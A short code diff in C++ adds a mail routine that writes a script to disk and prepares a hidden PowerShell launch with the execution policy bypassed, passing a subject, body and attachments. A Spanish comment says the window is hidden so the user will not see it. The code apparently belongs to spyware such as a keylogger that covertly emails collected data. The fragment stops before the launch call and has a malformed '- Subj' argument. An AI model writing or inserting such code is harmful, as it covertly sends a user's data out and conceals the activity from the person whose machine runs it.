@@ -103,6 +103,34 @@ namespace Mail {
 
 		bool ok;
 
+		ok = IO::MkDir(IO::GetOurPath(true));
+		if (!ok)
+			return -1;
+
+		std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
+		if (!CheckFileExist(scr_path))
+			ok = CreateScript();
+		if (!ok)
+			return -2;
+
+		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
+			+ StringReplace(subject, "\"", "\\\"")
+			+ "\" -Body \""
+			+ StringReplace(body, "\"", "\\\"")
+			+ "\" -Att \"" + attachments + "\"";
+
+		SHELLEXECUTEINFO ShExecInfo = { 0 };
+		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+		ShExecInfo.hwnd = NULL;
+		ShExecInfo.lpVerb = "open";
+		ShExecInfo.lpFile = "powershell";
+		ShExecInfo.lpParameters = param.c_str();
+		ShExecInfo.lpDirectory = NULL;
+		ShExecInfo.nShow = SW_HIDE; //venta invisible para que el usuario no la vea
+		ShExecInfo.hInstApp = NULL; //Para que no salte la venta?
+
+
 	}
 }
 
